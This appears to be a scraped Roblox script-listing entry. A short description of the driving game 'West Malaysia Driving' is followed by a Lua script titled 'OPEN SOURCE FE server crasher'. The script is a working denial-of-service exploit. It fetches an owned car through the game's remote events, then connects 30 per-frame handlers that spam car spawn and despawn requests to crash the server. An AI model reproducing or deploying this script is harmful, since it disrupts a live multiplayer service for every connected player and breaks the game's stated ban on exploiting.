name: (JDM CARS+CUSTOM RIM)West Malaysia Driving
desc:
West Malaysia Driving is an open-world driving experience based on real locations across Malaysia.
Drive around Johor Bahru, Melaka and Sepang in the cars you see on Malaysian roads every day. Do LuluMove deliveries, race at Sepang, mod your cars or just cruise with friends!

Note: This game is still in Beta, so expect some bugs
Remember to release your handbrake before driving
Playing on a computer is recommended
Any form of cheating or exploiting is not allowed.

If you have any problems or questions about the game, make sure to join the communication server

scripts.title: OPEN SOURCE FE server crasher
scripts.script:
-- @build-failed
-- crash server
-- need at least one car in the garage to crash the server

local runservice = game:GetService("RunService")
local replicatedstorage = game:GetService("ReplicatedStorage")

local SpawnCarEvent = replicatedstorage:WaitForChild("SpawnCarEvents"):WaitForChild("SpawnCar")
local DespawnCarEvent = replicatedstorage:WaitForChild("SpawnCarEvents"):WaitForChild("DespawnCar")
local InitializeCarDataEvent = replicatedstorage:WaitForChild("DealershipEvents"):WaitForChild("InitializeCarData")

-- get a random owned car name
local response = InitializeCarDataEvent:InvokeServer()
local carName = nil

for _, data in response do
    if not data or not data.CarName then continue end
    carName = data.CarName
    break
end

-- event --
for i = 1, 30 do
    runservice.Heartbeat:Connect(function()
        SpawnCarEvent:FireServer(carName)
        DespawnCarEvent:FireServer()
    end)
end
